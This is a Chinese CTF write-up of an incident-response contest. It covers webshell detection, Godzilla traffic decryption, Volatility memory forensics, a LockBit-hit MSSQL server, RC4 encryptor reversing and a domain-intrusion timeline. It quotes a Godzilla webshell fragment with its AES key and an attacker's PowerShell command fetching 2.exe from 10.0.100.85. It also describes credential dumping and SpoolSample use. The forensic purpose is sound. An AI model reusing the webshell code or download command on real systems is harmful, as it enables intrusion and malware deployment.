---
title: "第一届solar应急响应比赛"
date: 2026-05-21
lastmod: "2026-05-21T20:39:28+0800"
---
<!-- generated-by: obsidian_git_blog_pipeline -->

第一次做应急响应题目，主要以复现为主

## 日志流量
###  日志流量1 
```plain
题目文件：tomcat-wireshark.zip/web
新手运维小王的Geoserver遭到了攻击：
黑客疑似删除了webshell后门，小王找到了可能是攻击痕迹的文件但不一定是正确的，请帮他排查一下。
flag格式 flag{xxxx}
```

D 盾 · 应急响应 — WebShell 查杀

使用D盾的查杀功能，选择题目文件目录

![](assets/1767588067015-6f8eae39-0898-4dc8-9c94-43de56632e3e.png)

![](assets/1767587937787-b044dae8-8b69-4d6e-92a7-7c2ec7e3d7e4.png)

打开可疑文件，在里面发现base编码

![](assets/1767588313368-f120bc44-237a-472f-bb2d-925497136d45.png)

base64解码后发现是flag

![](assets/1767588405447-224d4849-90b5-4d47-a10b-4db06088643f.png)

```plain
flag{A7b4_X9zK_2v8N_wL5q4}
```

### 日志流量2
```plain
题目文件：tomcat-wireshark.zip/web
新手运维小王的Geoserver遭到了攻击：
小王拿到了当时被入侵时的流量，其中一个IP有访问webshell的流量，已提取部分放在了两个pcapng中了。请帮他解密该流量。
flag格式 flag{xxxx}
```

题目1是后门webshell，能在里面找到流量加密方式和密钥

```plain
String code="ZiFsXmEqZ3tBN2I0X1g5ektfMnY4Tl93TDVxNH0="; String xc="a2550eeab0724a69"; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }}
```

AES加密，密钥是`a2550eeab0724a69`



然后给了两个pcapng

test.pcapng里的流量较少，不过能追踪tcp流看出访问的是`/b.jsp`这个webshell

![](assets/1767589458479-00605d46-b886-4e19-8b59-d1008e3a9381.png)

这里根据Cookie值最后出现了分号可以判断它是哥斯拉流量！！

然后我们需要做的就是解密哥斯拉流量。

发现这个流量的格式是raw的，很混淆，不是标准的base64，那么我们转换到原始数据，直接用cyberchef解密即可

![](assets/1767590405130-07db6c01-64fd-493a-840f-996449d80ab7.png)

cyberchef魔法棒看到该文件是gzip文件，用gunzip解压

![](assets/1767590345731-97aef785-499a-4a20-9f03-2d56004b15dd.png)

![](assets/1767590371958-6bbffce3-3526-4514-8a43-1c660bbe2c37.png)

这要翻好久，终于翻到了一个flag.txt，readfile，那么flag可能就在响应包中

![](assets/1767590813142-a8211dc3-3060-4b51-95cc-ed0111fbc004.png)

拿到flag

![](assets/1767591439198-5659c9f9-14ce-44d9-a3b1-b83be384e4bf.png)

```plain
flag{sA4hP_89dFh_x09tY_lL4SI4}
```

### 日志流量3

```plain
题目文件：tomcat-wireshark.zip/web
新手运维小王的Geoserver遭到了攻击：
小王拿到了当时被入侵时的流量，黑客疑似通过webshell上传了文件，请看看里面是什么。
flag格式 flag{xxxx}
```

上传文件的流量data部分通常较大，这里正好能在上题的flag流量的下一个请求里看到，估计就是

![](assets/1767591680344-0d23a480-8abe-45d4-9ecf-181a549e7b4a.png)

![](assets/1767591633772-42b79fab-ba22-4067-8936-23f52d0c6455.png)

```plain
application/octet-stream
```

传的是flag.pdf

cyberchef里已经解压过gzip了，导出为pdf文件然后解压即可

![](assets/1767592101811-9f55f701-90ac-44ac-935c-56030f454c78.png)

```plain
flag{dD7g_jk90_jnVm_aPkcs}
```

## 签到
```plain
本题作为签到题,请给出邮服发件顺序。

Received: from mail.da4s8gag.com ([140.143.207.229])
by newxmmxszc6-1.qq.com (NewMX) with SMTP id 6010A8AD
for ; Thu, 17 Oct 2024 11:24:01 +0800
X-QQ-mid: xmmxszc6-1t1729135441tm9qrjq3k
X-QQ-XMRINFO: NgToQqU5s31XQ+vYT/V7+uk=
Authentication-Results: mx.qq.com; spf=none smtp.mailfrom=;
dkim=none; dmarc=none(permerror) header.from=solar.sec
Received: from mail.solar.sec (VM-20-3-centos [127.0.0.1])
by mail.da4s8gag.com (Postfix) with ESMTP id 2EF0A60264
for ; Thu, 17 Oct 2024 11:24:01 +0800 (CST)
Date: Thu, 17 Oct 2024 11:24:01 +0800
To: hellosolartest@qq.com
From: 鍏嬪競缃戜俊
Subject:xxxxxxxxxx
Message-Id: <20241017112401.032146@mail.solar.sec>
X-Mailer: QQMail 2.x

XXXXXXXXXX

flag格式为flag{domain1|...|domainN}
```

从给出的邮件头信息来看，邮件的发送顺序大致如下：

首先，邮件是从 `mail.solar.sec`，对应 `VM-20-3-centos` 这台主机发出，通过 `Postfix` 服务发送到 `mail.da4s8gag.com`

然后， `mail.da4s8gag.com`将邮件转发到 `newxmmxszc6-1.qq.com` （通过 `NewMX` 以及相关的 `SMTP` 服务，有对应的 `id` 编号等记录），最终目标是要发送给 `hellosolartest@qq.com` 收件人

```plain
flag{mail.solar.sec|mail.da4s8gag.com|newxmmxszc6-1.qq.com}
```

## 内存取证

### 内存取证1
```plain
题目文件：SERVER-2008-20241220-162057
请找到rdp连接的跳板地址
flag格式 flag{1.1.1.1}
```

![](assets/1767592308939-9d133f0e-c304-4579-b8e4-5495b07ebb76.png)

给了raw文件，用内存取证软件，这里我用的lovelymem

在网络详情里找到3389端口，rdp相关的找3389端口就行，找到目的ip

![](assets/1767593497420-5bf1c5d6-a597-4428-9a83-41850e1d328b.png)

```plain
flag{192.168.60.220}s
```

这lovelymem更新了我还不太会用，放弃使用volatility3了

![](assets/1767595776763-609e1b50-4f26-460c-a091-dc41c283d2fd.png)

### 内存取证2
```plain
题目文件：SERVER-2008-20241220-162057
请找到攻击者下载黑客工具的IP地址
flag格式 flag{1.1.1.1}
```

下载黑客工具，那么netscan的连接肯定是可以看到的，但我们无法判断是哪个，只能一个一个试，这是一种方法

还有一种方法，下载黑客工具，那么黑客肯定要执行命令，我们看cmdscan即可

```plain
volatility_2.6_win64_standalone.exe cmdscan -f E:\第一届solar应急响应比赛\【题目】小题+综合题\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64
```

![](assets/1767596517985-e9e45c8c-c037-48b9-9e41-b7aab51bb6cc.png)

![](assets/1767595860374-974ff4ee-03ac-4662-b9e5-5316ee977652.png)

mimikatz内网渗透必备工具，那ip就知道了

```plain
flag{155.94.204.67}
```

### 内存取证3
```plain
题目文件：SERVER-2008-20241220-162057
攻击者获取的“FusionManager节点操作系统帐户（业务帐户）”的密码是什么
flag格式 flag{xxxx}
```

![](assets/1767595641385-97886cc9-a9d8-4fd9-a645-6cae8c047fc2.png)

看cmdline看到一个pass.txt，有可能就是。同时根据命令执行的顺序，pass.txt应该在桌面上

接下来我们用filescan查看文件

```plain
volatility_2.6_win64_standalone.exe -f E:\第一届solar应急响应比赛\【题目】小题+综合题\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 filescan | findstr "pass"
```

![](assets/1767595988124-6f37130b-b09b-4c12-9cc1-2e218291843d.png)

使用dumpfiles插件导出，这里lovelymem不会用，还是用volatility2

```plain
volatility_2.6_win64_standalone.exe -f E:\第一届solar应急响应比赛\【题目】小题+综合题\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e4cedd0 -D ./
```

![](assets/1767596423698-c8ecf732-4006-4cca-a8ae-874c4f1ccc89.png)

导出后打开文件，找到密码

![](assets/1767596583361-09fb60e0-58de-4d43-a30b-c3cbff3ef8ad.png)

```plain
flag{GalaxManager_2012}
```

### 内存取证4
```plain
题目文件：SERVER-2008-20241220-162057
请找到攻击者创建的用户
flag格式 flag{xxxx}
```

获取注册表中的用户，然后排除系统用户后一个个试

```plain
volatility_2.6_win64_standalone.exe -f E:\第一届solar应急响应比赛\【题目】小题+综合题\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 printkey  -K  "SAM\Domains\Account\Users\Names"
```

![](assets/1767596723230-f1653fab-ea41-4a53-b0b9-ea1d09395e05.png)

```plain
flag{ASP.NET}
```

### 内存取证5
```plain
题目文件：SERVER-2008-20241220-162057
请找到攻击者利用跳板rdp登录的时间
flag格式 flag{2024/01/01 00:00:00}
```

**方法一：**

先找找到rdp对应的进程

```plain
volatility_2.6_win64_standalone.exe -f E:\第一届solar应急响应比赛\【题目】小题+综合题\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 netscan | findstr "3389"
```

![](assets/1767597039673-ca74ef57-9019-420c-8c87-22b60ce540f2.png)

然后再搜进程

```plain
volatility_2.6_win64_standalone.exe -f E:\第一届solar应急响应比赛\【题目】小题+综合题\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 pslist | findstr "1908"
```

![](assets/1767605550805-807930e5-b54c-40d4-bb01-95509290fa41.png)

一个是pid一个是ppid，两个都试试

题目没说，但要转换成CST，这里的时间是UTC+0000

```plain
flag{2024/12/21 00:15:34}
```

方法二：

在filescan文件中可以找到Windows日志文件Security.evtx，注意大写

`security.evtx` 是 Windows 操作系统中的一个事件日志文件，主要记录与系统安全相关的事件信息。它是 Windows 日志文件的一部分，用于存储关于用户登录、账户管理、安全审计、系统访问控制等事件的数据。

攻击者利用跳板rdp登录受害机，那么windows日志肯定会有相关记录。

```plain
volatility_2.6_win64_standalone.exe -f E:\第一届solar应急响应比赛\【题目】小题+综合题\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 filescan | findstr "Security.evtx"
```

![](assets/1767605934638-235d70da-4933-41ef-9e05-5ee096fc2c90.png)

然后dumpfile

```plain
volatility_2.6_win64_standalone.exe -f E:\第一届solar应急响应比赛\【题目】小题+综合题\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e744ba0 -D ./
```

修改文件后缀为.evtx后放到windows日志分析器里分析

![](assets/1767606456306-47719e31-9c9a-4a37-a7d2-d9455b1569e3.png)

![](assets/1767606554546-0e604012-3cf1-407a-8be9-7f6b98685c55.png)

### 内存取证6
```plain
题目文件：SERVER-2008-20241220-162057
请找到攻击者创建的用户的密码哈希值
flag格式 flag{XXXX}
```

hashdump看密码哈希，创建的用户是ASP.NET

```plain
volatility_2.6_win64_standalone.exe -f E:\第一届solar应急响应比赛\【题目】小题+综合题\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 hashdump
```

![](assets/1767606770453-467eb951-ddda-4d22-be38-52257371b2dd.png)

```plain
flag{5ffe97489cbec1e08d0c6339ec39416d}
```

## 数据库
_ 说明：由于黑客在攻击时可能会修改用户口令、锁定登陆、破坏系统导致无法进入操作系统，因此本题不提供密码 _

附件提供了ovf，因此需要导入后通过pe镜像免密码登录

![](assets/1767609093966-33a55cba-0dee-4363-89d0-4345622d4f37.png)

VMware虚拟机进入pe系统： pe镜像下载地址

[https://www.hotpe.top/download/](https://www.hotpe.top/download/)

![](assets/1767609157427-6bdcea79-2868-48c2-9c0a-f22c195f6d30.webp)

 在虚拟机编辑设置CD/DVD处选择pe镜像，替换导入的镜像 

![](assets/1767609185308-3afbe320-e895-4123-a765-7fe78b0cc2f8.webp)

 选择电源-->打开电源时进入固件 

![](assets/1767609193415-0429c3ab-6b5b-43ce-8bd9-138920f00702.webp)

在 boot选项中调整启动顺位 

![](assets/1767609205165-4f0a1c7a-105c-43c6-8e6b-7a5de6127d36.webp)

进入后无需登录

+ `Boot (X:)`：这是 WinPE 常见的**内存盘/临时系统盘**，PE 自己运行在这里
+ `DVD 驱动器 (E:)`：挂载的 **HotPE ISO**
+ `本地磁盘 (D:) / 系统保留 (C:)` 等：这是虚拟硬盘里的分区被 PE 挂载后的盘符，能直接浏览目标 Windows 的文件系统

![](assets/1767609212973-75df0df7-0711-4e4a-916e-59e7aa2c2ded.webp)

 可以在源系统盘看到勒索信X3rmENR07.README.txt，被加密的文件后缀为.X3rmENR07 

![](assets/1767609865573-14ff4b09-7254-4435-8f1b-f5a921ee2ff6.webp)

![](assets/1767609870703-5b141e8e-0a35-4a28-9d9c-4a160fc37bc6.webp)

 搜索后缀名得知为lockbit勒索家族 

![](assets/1767609878412-e3199474-39e3-4e55-b195-9b8dc602f1fd.webp)



还有这里火眼仿真可以直接看到密码

![](assets/1767614309662-117fcbb0-4b25-40b4-8d5c-badc1d0f9ecc.png)

### 数据库1
```plain
题目附件：mssql、mssql题-备份数据库
请找到攻击者创建隐藏账户的时间
flag格式 如 flag{2024/01/01 00:00:00}
```

需要查看windows日志

```plain
法一
win+R 输入eventvwr.msc

法二
PE的位置D:/Windows/System32/winevt/Logs/Security.evtx 直接查看原系统日志文件
```

pe方法的虚拟机里面好像没有事件查看器，但火眼仿真的里面有

在windows中，账户名以$结尾的表示隐藏的共享或资源

用宝瓜直接翻

![](assets/1767610789434-17e3e4ea-cc92-412c-bcad-803b020bd369.png)

用windows自带的事件查看器查看，需要先发现test$隐藏账户，然后搜索

![](assets/1767611031273-b8d2ddb8-97db-45df-89d4-56ebad47318e.png)

```plain
flag{2024/12/16 15:24:21}
```

### 数据库2
```plain
题目附件：mssql、mssql题-备份数据库
请找到恶意文件的名称
flag格式 如 flag{*.*}
```

传个杀毒软件上去扫描一下，这个应该是能用火绒剑看到的，但这个恶意文件好像运行不了，就看不到了

![](assets/1767612155319-e1b0f0a0-eb22-4341-ba24-9cdbc87fabdf.webp)

查一下这个是啥

![](assets/1767612280890-aa0e542e-1b5d-4172-ad7f-54fb6ed2d7e3.png)

那就是了

```plain
flag{xmrig.exe}
```

### 数据库3
```plain
题目附件：mssql、mssql题-备份数据库
请找到恶意文件的外联地址
flag格式 如 flag{1.1.1.1}
```

这个应该能直接在火绒剑里看到

![](assets/1767612724930-845fd88d-c217-4018-af21-011210a23236.png)

没办法，只能去翻文件了，在恶意文件的配置文件中可以看到外联的url为“sierting.com”

![](assets/1767612702050-e7cb9013-1389-4481-9dcb-f5801aab74fd.png)

然后dns解析

![](assets/1767612992795-5ec06f7c-a8f3-4d9d-9be6-1c8053c47a3a.png)

这个和官方wp不一样，我感觉是因为我是很久之后复现的，所以域名ip换了

![](assets/1767613045938-bdd02755-c9e6-4c6d-9960-345b03938f94.webp)

不过好像可以直接在虚拟机里打开改恶意文件，能看到ip

![](assets/1767622733346-fa229e24-c5d2-4aa8-ad67-40be95b9ca2b.png)

答案如下

```plain
flag{203.107.45.167}
```

### 数据库4
```plain
题目附件：mssql、mssql题-备份数据库
请修复数据库
flag格式 如 flag{xxxxx}
```

正常思路先去找勒索病毒的分析

 修复数据库 Solar官方对病毒进行的分析 [https://blog.csdn.net/solarset/article/details/144318706](https://blog.csdn.net/solarset/article/details/144318706)

能在里面看到这两句

![](assets/1767622241294-3b331cb8-46a5-4fc5-b864-3957cd3d5702.png)

![](assets/1767622216247-93a8b9ec-f6b0-4cb9-9518-0b1a1800d04a.png)

 猜测flag根本就没出问题，直接找到数据库路径后开搜 

![](assets/1767622170073-4b72788a-2eeb-4bb1-9632-629a62e98ff6.png)



下面是官方做法

官方wp说使用数据库修复工具“D-Recovery SQL Server”进行修复

![](assets/1767617112009-964114b0-d293-4628-84d2-ceb56c02aef7.png)

怪，我就这张表复现不出来

![](assets/1767621851918-9b72bce3-6c30-4a7b-aefe-2c53615e6c8d.png)

这是官方复现的，可能是版本问题

![](assets/1767621894032-8ab58a20-7225-4830-8c45-be71a6e61850.webp)

```plain
flag{E4r5t5y6Mhgur89g}
```

### 数据库5
```plain
题目附件：mssql、mssql题-备份数据库
请提交powershell命令中恶意文件的MD5
flag格式 如 flag{xxxxx}
```

powershell命令，查看日志

```plain
法一
win+R 输入eventvwr.msc

法二
PE的位置D:/Windows/System32/winevt/Logs/Windows PowerShell.evtx 直接查看原系统日志文件
```

![](assets/1767614898821-851ae9a7-fa65-49c7-bc72-65b1d14e3fa2.png)

![](assets/1767615026233-4ca6a03c-83d6-4259-80d2-625d7995da01.png)

里面能看到一堆远程命令执行的内容，而且里面还是写加密的内容

一眼顶针，捕捉到base64关键词

![](assets/1767615109123-0d2f405a-d21b-45ff-ae28-aaaf585fe64f.png)

同时后面还发现了System.IO.Compression.GzipStream

根据时间判断，应该是先gz压缩，再base64

按找从早到晚的顺序理一下流程，先上传了test.txt的代码

![](assets/1767616289515-d151ca9f-bcfd-4584-9cc7-5537ec8c8295.png)

然后运行了代码，里面是木马

![](assets/1767616337407-8c800679-aacf-4c71-a649-b4c679c6ddc2.png)

把代码里的base64解码后导出，放到微步云沙箱里

![](assets/1767616399784-a3e2e2f2-5f1b-4300-abd5-4a5a25f7e2c9.png)

![](assets/1767616381873-578a4576-2ab4-4004-83e4-997bc3505085.png)

可以看到确实是木马文件，那我们只需要其md5值即可

```plain
flag{d72000ee7388d7d58960db277a91cc40}
```

## 逆向破解
### 逆向破解1
```plain
题目文件：【题目】加密器逆向
请逆向该加密器，解密机密文件
flag格式 flag{XXXX}
```

交给ai吧，不想逆向了

下面是官方wp



在createfileW处下断点，

![](assets/1767623709284-d060524b-5962-4c13-9b73-60da2cd26b54.png)

断住之后发现输入的参数为一个文件路径

跟踪发现这里使用随机数生成了六位密钥

![](assets/1767623709224-40637bf4-45f4-491d-82d1-71e20b087767.png)

将生成的密钥%10，即生成0-9的密钥

![](assets/1767623709244-8f536e12-26b8-4cc8-8aa6-68cedc762fd0.png)

明显的rc4特征，rc4密钥初始化

![](assets/1767623709752-f29c9733-5519-4cd0-ac8a-5f02fc5f4d47.png)

交换数组位置，这里就是利用key生成s盒，相当于

```plain
for i in 0..256 {
    j = (j + s[i]  + key[i % key.len()] ) % 256;
    s.swap(i, j);
}
```

![](assets/1767623709524-f5376c0d-e720-481e-9139-8a05ae0e2ebb.png)

使用刚刚读取到的内容（v5），利用PRGA生成秘钥流并与密文字节异或，完成rc4加密

![](assets/1767623709705-5ed2bfd2-f814-45d7-af95-d39ea1f7eaaf.png)

生成字符串

![](assets/1767623709940-af7327b5-4e66-4fd9-8c85-01d4ff457dc7.png)

如下

![](assets/1767623709844-b02b51c6-fa93-478c-a06a-7a4d3e71c6e5.png)

再次生成字符串

![](assets/1767623710010-39c333fd-9dfc-492a-be1a-7203465d4242.png)

如下

![](assets/1767623710085-804a6804-e513-41f9-9a84-e6d9f5add363.png)

将加密后的字符串和自解密生成的字符串拼接，其中自解密生成的字符串无实际用途，每次生成的都一样，仅为加密特征。

![](assets/1767623710216-71eae8aa-25fe-4fb9-b788-97cab644b8f2.png)

![](assets/1767623710358-a407cbec-7727-4700-bf6c-6601a513bd86.png)

创建文件

![](assets/1767623710372-bb72b8bd-a99f-42a5-97b3-b1a9756d2dec.png)

![](assets/1767623710512-4857408b-b069-4910-8da1-6a94ba028cf8.png)

写入文件

![](assets/1767623710542-23ced780-df27-4e77-aadc-06488509c575.png)

由于密钥是随机生成的，但是因为密钥只有6位而且取值为0-10，因此可以直接爆破出结果

```plain
import itertools
import os
from concurrent.futures.thread import ThreadPoolExecutor


def rc4(key, data):
    key_length = len(key)
    S = list(range(256))
    j = 0

    for i in range(256):
        j = (j + S[i] + key[i % key_length]) % 256
        S[i], S[j] = S[j], S[i]

    i = 0
    j = 0
    result = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        result.append(byte ^ K)

    return result

def is_printable(data):
    try:
        return all(32 <= byte <= 126 for byte in data)
    except TypeError:
        return False

ciphertext = []#加密后的数据




def run(key_tuple ):
    key = list(key_tuple)
    decrypted_data = rc4(key, ciphertext)
    # 判断是否解密后的数据是可打印的
    if is_printable(decrypted_data):
        decrypted_string = ''.join(chr(byte) for byte in decrypted_data)
        if 'flag' in decrypted_string:
            print(f"找到有效密钥: {key} -> 解密结果: {decrypted_string}")
max_threads = os.cpu_count()*2
print(max_threads)
with ThreadPoolExecutor(max_workers=max_threads) as executor:
    executor.map(run, itertools.product(range(0, 10), repeat=6))
```

![](assets/1767623710775-d2b79544-e56d-4097-b994-535c8196e067.png)

其中加密后缀为一个假的flag，但是可以解出结果

![](assets/1767623710875-cb604d80-fb74-4e6a-8d46-ff1249fc7832.png)

```plain
flag{SET666!}
```

## 综合应急
### 综合应急1为理论题
### 综合应急2
通过综合应急-1初步分析，dc03是最后一个被入侵所给环境的机器。在其可能存在横向的行为。进而分析dc03的sysmon日志分析



官方wp挺混乱的，在各个日志里跳跃

然后上文说分析dc03的sysmon日志就是分析Microsoft-Windows-Sysmon%4Operational.evtx这个日志，也就是官方wp的最后一步，下面是官方wp，个人复现在最后



24/12/18 9:01:40分以sa账户连接数据库（sql01 Application.evtx）

![](assets/1767625161363-d852a343-1d59-43cd-ba0d-900e3700cdf2.png)24/12/18 9:02:04 由sqlservr.exe通过clr调用cmd.exe而后执行powershell -c iwr -uri http://10.0.100.85:81/2.exe -o C:/windows/tasks/2.exe

![](assets/1767625161389-5691dbe4-5445-4d42-b40c-4c983c01d673.png)

![](assets/1767625161583-9c537d44-fbf1-4957-a7a6-182a5fcb3786.png)

24/12/18 9:02:08 执行木马

![](assets/1767625161708-06f83e81-bb39-4a29-9948-45355ff3c63a.png)

24/12/18 9:02:15创建管道spoolss，9:02:18 获取system权限

![](assets/1767625161768-a7f25ba7-eb1d-48c5-ac42-7b0cbd9daa2b.png)

![](assets/1767625161989-270480a8-ef2f-496e-9634-0662d40ebee6.png)

24/12/18 9:02:50访问进程lsass.exe,推测攻击者从中获取哈希

![](assets/1767625162068-928ef6e4-d7a3-4df3-a9bc-77dda1f1b10b.png)

24/12/18 9:03:27 使用sql01账户通过wmi连接服务器

![](assets/1767625162115-02519ee9-7580-4ade-a098-2e4220f73841.png)

24/12/18 9:03:54 创建用户admin

![](assets/1767625162130-1f0d2f42-8160-4722-a3f5-30f994f43bc3.png)

24/12/18 9:03:55发现攻击者ip 10.0.100.85

![](assets/1767625162217-a4ac9f9c-5cc3-49b4-ac07-65510f3356bd.png)

24/12/18 9:05:14加载了pv.ps1,从文本中可发现该脚本实际为PowerView.ps1，主要作用是在域内做信息收集。

![](assets/1767625162485-440a8524-53f3-49f9-8a01-3a60b271147e.png)

![](assets/1767625162528-3f0ebf83-72f5-4e68-a0dc-91bb26e3ebbf.png)

![](assets/1767625162599-a1b1518d-7416-4083-bc27-a1cb4f51feeb.png)

24/12/18 9:10:44 进行dns查询

![](assets/1767625162711-8ed35e01-349b-47ef-9b60-1d11bca22601.png)

24/12/18 9:11:15 修改administrator账户密码为Password@123

![](assets/1767625162665-97d59bee-6781-4365-94d4-761ce3206538.png)

24/12/18 9:11:24.000 攻击者使用sql01本地管理员administrator账户RDP登陆服务器

![](assets/1767625162923-a71303f1-7305-4bc6-a081-484b60cc3fb5.png)

24/12/18 9:11:26.000 修改防火墙配置

![](assets/1767625163016-2465dc89-a094-454c-a5f5-27031de3207c.png)

24/12/18 9:16:19.220 攻击者使用sql01账户登陆sql02数据库，之后执行命令下载木马并执行木马，提权后修改了sql02本地管理员administrator

![](assets/1767625163038-47ad6805-3e6e-4909-ab15-0b3d80523722.png)

![](assets/1767625163182-4ddefbe2-d369-4058-82cf-5369cdd9990b.png)

24/12/18 9:22:07.000 疑似利用web漏洞执行命令(web 01\W3SVC2\u_ex241218.log)

![](assets/1767625163234-02a41610-40cb-478c-ab82-f25188820f29.png)

24/12/18 9:26:46.000 创建调用PowerView.ps1

![](assets/1767625163343-ccee737f-8fe3-4875-b14b-a8f3801862e0.png)

24/12/18 9:33:54.000 web应用为域用户iis权限

![](assets/1767625163552-45151b47-1ec4-4366-a5bb-7a0e19f52f98.png)

![](assets/1767625163596-350d9d63-9a18-4fcb-abd4-4c944c4f7400.png)

24/12/18 9:59:44.000 修改web01本地管理员administrator密码

![](assets/1767625163657-5842ddbf-f347-4736-8bbf-0802f5373814.png)

24/12/18 9:59:50 rdp连接

![](assets/1767625163758-4ede4647-a3a9-492f-893d-4d704b4d30ab.png)

24/12/18 10:12:14 关闭防火墙

![](assets/1767625163850-6353ed46-0fbc-45a6-bd39-68615621bcbc.png)

24/12/18 10:12:19 攻击者利用无约束委派请求票据，获取票据后利用票据获取域内账户hash

![](assets/1767625164189-4393043d-8dfc-47bf-b6ee-42a3bea74909.png)

![](assets/1767625164020-88d8a177-de26-46a6-a359-29f879357d3e.png)

24/12/18 10:31:08 攻击者通过winrm使用administrator哈希登陆dc02

![](assets/1767625164131-bad1c4ed-97d2-4af5-b82e-a29b4c41ee17.png)

24/12/18 10:31:20 修改域管理员密码

![](assets/1767625164254-e8a76fea-4a0e-4d1a-ac4c-1725f7a19b32.png)

24/12/18 10:31:28 RDP登陆

![](assets/1767625164276-2c639e80-0217-4114-b201-5db39ea2fd6b.png)

24/12/18 10:31:49-24/12/18 10:31:50 上传黑客工具

![](assets/1767625164492-2c3a79f1-43d8-4f95-bcae-21814f121893.png)

24/12/18 10:48:39 执行命令SpoolSample.exe dc03 dc02

![](assets/1767625164743-f97d64ad-b826-45b8-87bd-049891fcb9f0.png)

24/12/18 10:53:02.000 注入票据

![](assets/1767625164676-581f0ce1-25ca-4501-a19f-1df012d114dc.png)

24/12/18 16:35:22 攻击者使用333.exe工具使10.0.11.6与10.0.11.8进行tcp连接

![](assets/1767625164729-fae99a6a-dcab-4e51-a9d4-a2b0c57b129f.png)

24/12/18 16:37:14 攻击者使用333.exe工具使10.0.11.6与10.0.11.10进行tcp连接

![](assets/1767625164786-bfbe806b-f11e-4ddc-a9a8-7c6eff25f2d9.png)



我复现的最后两张的截图，都在dc03的Microsoft-Windows-Sysmon%4Operational.evtx这个日志里找到

24/12/18 16:35:22 攻击者使用333.exe工具使10.0.11.6与10.0.11.8进行tcp连接

![](assets/1767658254429-fc323a85-6611-4fd6-9e62-47c5aeb78b47.png)24/12/18 16:37:14 攻击者使用333.exe工具使10.0.11.6与10.0.11.10进行tcp连接

![](assets/1767658420717-aeba2465-de44-4145-9596-3cdb20ba6c7c.png)

